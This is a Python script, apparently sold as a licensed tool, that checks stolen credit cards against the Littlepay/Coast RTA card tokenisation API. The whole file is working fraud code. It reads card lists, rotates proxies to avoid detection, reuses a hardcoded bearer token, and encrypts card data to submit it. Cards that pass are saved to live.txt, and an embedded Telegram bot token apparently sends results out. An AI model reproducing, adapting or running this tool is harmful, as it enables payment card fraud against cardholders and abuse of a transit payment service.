# @piezxc28 (Kyu)
# CVV CHECKER - OWN MERCH (With Remote Key & Expiry System)
# !/usr/init/env python3
"""
Littlepay Coast RTA - Card Verification CLI (Updated Token Endpoint + Proxy Health + Crash Guard + Key System)
Gateway: Coast RTA / Littlepay

Approved cards are appended to live.txt.
"""

import argparse
import base64
import json
import os
import platform
import re
import secrets
import subprocess
import sys
import threading
import time
import urllib.parse
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

warnings.simplefilter("ignore")
try:
    import urllib3
    urllib3.disable_warnings()
except Exception:
    pass

try:
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")
except Exception:
    pass

import requests
from jose import jwe
from jose.utils import base64url_encode

TOKENISATION_BASE = "https://web.uk.littlepay.com"
SNAPPER_BASE = "https://coastrta.littlepay.com"
CARD_CAPTURE_ORIGIN = "https://card-capture.littlepay.com"
CALLBACK_URL = f"{SNAPPER_BASE}/en/coast-rta/trip-history"
PARTICIPANT_ID = "coast-rta"
UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1"

DEFAULT_MASS_FILE = "cards.txt"
DEFAULT_PROXIES_FILE = "proxies.txt"
LIVE_FILE = "live.txt"
KEY_FILE = "license.key"
PROXY_CHECK_URL = "https://api.ipify.org?format=json"
REMOTE_KEY_API = "https://kyu-auth-api.onrender.com/verify.php"
INLINE_BEARER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXJkaG9sZGVyQXV0aFR5cGUiOiJDVlYiLCJhZGRyZXNzUmVxdWlyZWRGb3JWZXJpZmljYXRpb24iOmZhbHNlLCJwYXJ0aWNpcGFudF9pZCI6ImNvYXN0LXJ0YSIsImV4cCI6MTc5NDU3MjQwMiwibmFtZSI6IkNBUkRfVE9LRU5JU0FUSU9OIn0.Fin7fy3YesZsGCNe-owY9x6-RGK2qGykGSIYhbJDE8k"

def _load_tg_creds() -> tuple[str, str]:
    return "9198628207:AAH3PsBEh6S5Xo7SytUohMD3Of95d9eGTbQ", "6516330870"

TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID = _load_tg_creds()
PROXY_TIMEOUT = 8
PROXY_THREADS = 50
HTTP_ATTEMPTS = 5

_print_lock = threading.Lock()
_tg_lock = threading.Lock()

def send_telegram_alert(message: str) -> bool:
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    with _tg_lock:
        for _ in range(3):
            try:
                r = requests.post(url, json=payload, timeout=10)
                if r.status_code == 200:
                    return True
            except Exception:
                time.sleep(0.5)
    return False

def detect_card_type(card_number: str) -> str:
    n = card_number.replace(" ", "")
    if not n:
        return ""
    if len(n) >= 2 and n[:2] in ("51", "52", "53", "54", "55"):
        return "MASTERCARD"
    if len(n) >= 4 and "2221" <= n[:4] <= "2720":
        return "MASTERCARD"
    if n[0] == "4":
        return "VISA"
    if len(n) >= 2 and n[:2] in ("34", "37"):
        return "AMEX"
    if len(n) >= 4 and n[:4] in ("6011", "65"):
        return "DISCOVER"
    return "UNKNOWN"

def fetch_bin_metadata(card_number: str) -> dict:
    bin_num = card_number.replace(" ", "")[:8]
    meta = {"bank": "UNKNOWN", "brand": detect_card_type(card_number).upper(), "type": "UNKNOWN", "country": "UNKNOWN", "flag": ""}
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", headers={"Accept-Version": "3", "User-Agent": UA}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            meta["brand"] = (data.get("brand") or meta["brand"]).upper()
            meta["type"] = (data.get("type") or "UNKNOWN").upper()
            bank_info = data.get("bank", {})
            meta["bank"] = (bank_info.get("name") or "UNKNOWN").upper()
            country_info = data.get("country", {})
            meta["country"] = (country_info.get("name") or "UNKNOWN").upper()
            alpha2 = country_info.get("alpha2", "")
            if alpha2:
                meta["flag"] = "".join(chr(ord(c) + 127397) for c in alpha2.upper())
                meta["country"] = alpha2.upper()
    except Exception:
        pass
    return meta

def api_key_to_jwk(key_entry: dict) -> dict:
    mod_hex = key_entry["modulus"].replace(":", "")
    exp_int = int(key_entry["exponent"])
    exp_hex = format(exp_int, "x")
    if len(exp_hex) % 2 != 0:
        exp_hex = "0" + exp_hex
    return {
        "kty": "RSA",
        "n": base64url_encode(bytes.fromhex(mod_hex)).decode("ascii"),
        "e": base64url_encode(bytes.fromhex(exp_hex)).decode("ascii"),
    }

def create_jwe(plaintext: str, key_entry: dict) -> str:
    jwk = api_key_to_jwk(key_entry)
    token = jwe.encrypt(plaintext.encode("utf-8"), jwk, encryption="A128CBC-HS256", algorithm="RSA-OAEP")
    return token.decode("ascii")

def build_card_payload(card: dict, holder_name: str = "", default_country: str = "US") -> dict:
    p = {
        "ch_name": holder_name or "",
        "cc_num": card["cardNumber"],
        "card_type": detect_card_type(card["cardNumber"]).lower(),
        "card_date": card["expiry"],
        "ch_address1": "", "ch_address2": "", "ch_town_city": "", "ch_postcode": "",
        "ch_country": default_country,
    }
    if card["cvv"]:
        p["card_cvv"] = card["cvv"]
    return p

def parse_card_input(card_str: str) -> dict:
    parts = card_str.strip().split("|")
    if len(parts) not in (3, 4):
        raise ValueError(f"Expected cc|mo|yr|cvv, got {len(parts)} parts")
    cc, mo, yr = [p.strip() for p in parts[:3]]
    cvv = parts[3].strip() if len(parts) == 4 else ""
    return {
        "cardNumber": cc,
        "expiry": f"{mo}/{yr[-2:]}",
        "expiryMonth": mo,
        "expiryYear": yr[-2:],
        "cvv": cvv,
    }

class ProxyPool:
    def __init__(self, proxies: list[str]):
        self.proxies = list(proxies)
        self.i = 0
        self.lock = threading.Lock()

    def next_dict(self) -> dict[str, str] | None:
        if not self.proxies:
            return None
        with self.lock:
            p = self.proxies[self.i % len(self.proxies)]
            self.i += 1
        return {"http": p, "https": p}

class TokenManager:
    def __init__(self, raw_token: str, pool: ProxyPool | None = None):
        self.raw_token = raw_token
        self.pool = pool
        self.active_token = raw_token
        self.expires_at = time.time() + 3600
        self.lock = threading.Lock()

    def refresh(self) -> str:
        with self.lock:
            url = f"{TOKENISATION_BASE}/api/v1/customer/tokens/request-token"
            headers = {
                "Authorization": f"Bearer {self.raw_token}",
                "Content-Type": "application/json;charset=UTF-8",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://coastrta.littlepay.com",
                "Referer": "https://coastrta.littlepay.com/",
                "User-Agent": UA
            }
            body = {"request_access": "CARD_TOKENISATION", "external_participant_id": PARTICIPANT_ID}
            session = requests.Session()
            session.trust_env = False
            for _ in range(3):
                p_dict = self.pool.next_dict() if self.pool else None
                try:
                    resp = session.post(url, json=body, headers=headers, proxies=p_dict, timeout=15, verify=False)
                    if resp.status_code == 200:
                        data = resp.json()
                        token = data.get("access_token")
                        if token:
                            self.active_token = token
                            parts = token.split(".")
                            if len(parts) == 3:
                                payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode("utf-8"))
                                self.expires_at = payload.get("exp", time.time() + 3600)
                            else:
                                self.expires_at = time.time() + 3600
                            return self.active_token
                except Exception:
                    time.sleep(0.5)
            return self.active_token

    def get_token(self) -> str:
        if time.time() >= (self.expires_at - 300):
            return self.refresh()
        return self.active_token

def _tok_headers(bearer: str) -> dict:
    return {
        "Authorization": f"Bearer {bearer}",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": CARD_CAPTURE_ORIGIN,
        "Referer": f"{CARD_CAPTURE_ORIGIN}/",
        "User-Agent": UA,
    }

def step1_get_public_keys(session: requests.Session, bearer: str, pool: ProxyPool | None, token_mgr: TokenManager) -> dict:
    resp = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys", headers=_tok_headers(bearer), proxies=pool.next_dict() if pool else None, timeout=15, verify=False)
    if resp.status_code != 200:
        raise RuntimeError("Walang nakuha na public keys mula sa server.")
    keys = resp.json().get("list")
    if not keys:
        raise RuntimeError("Walang nakuha na public keys mula sa server.")
    return secrets.choice(keys)

def step2_authenticate(session: requests.Session, bearer: str, key_entry: dict, jwe_token: str, pool: ProxyPool | None, token_mgr: TokenManager) -> dict:
    resp = session.post(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate", headers=_tok_headers(bearer), json={"key_id": key_entry["id"], "encrypted_payment_data": jwe_token, "payment_token_type": "CARD_DATA", "save_card": False}, proxies=pool.next_dict() if pool else None, timeout=15, verify=False)
    return resp.json()

def step3_get_payment_token(session: requests.Session, bearer: str, auth_id: str, pool: ProxyPool | None, token_mgr: TokenManager) -> dict:
    resp = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}", headers=_tok_headers(bearer), proxies=pool.next_dict() if pool else None, timeout=15, verify=False)
    return resp.json()

def run_card(card: dict, token_mgr: TokenManager, country: str, pool: ProxyPool | None, holder_name: str = "") -> tuple:
    session = requests.Session()
    session.trust_env = False
    meta = fetch_bin_metadata(card["cardNumber"])
    try:
        bearer = token_mgr.get_token()
        chosen_key = step1_get_public_keys(session, bearer, pool, token_mgr)
        payload = build_card_payload(card, holder_name=holder_name, default_country=country)
        jwe_token = create_jwe(json.dumps(payload, separators=(",", ":")), chosen_key)
        auth_result = step2_authenticate(session, bearer, chosen_key, jwe_token, pool, token_mgr)
        auth_status = str(auth_result.get("status") or auth_result.get("state") or "").upper()
        if auth_status in ("FAILED", "DECLINED", "REJECTED", "ERROR", "UNAUTHENTICATED"):
            return 1, f"CARD_DECLINED ({auth_status})", meta
        auth_id = auth_result.get("authentication_id")
        if not auth_id:
            return 1, "CARD_DECLINED", meta
        token_result = step3_get_payment_token(session, bearer, auth_id, pool, token_mgr)
        tok_status = str(token_result.get("status") or token_result.get("state") or "").upper()
        if tok_status in ("FAILED", "DECLINED", "REJECTED", "ERROR", "UNAUTHENTICATED"):
            return 1, f"CARD_DECLINED ({tok_status})", meta
        payment_token = token_result.get("authenticated_payment_token")
        if not payment_token:
            return 1, "CARD_DECLINED", meta
        return 0, "APPROVED", meta
    except Exception as e:
        return 2, f"{type(e).__name__}: {e}", meta
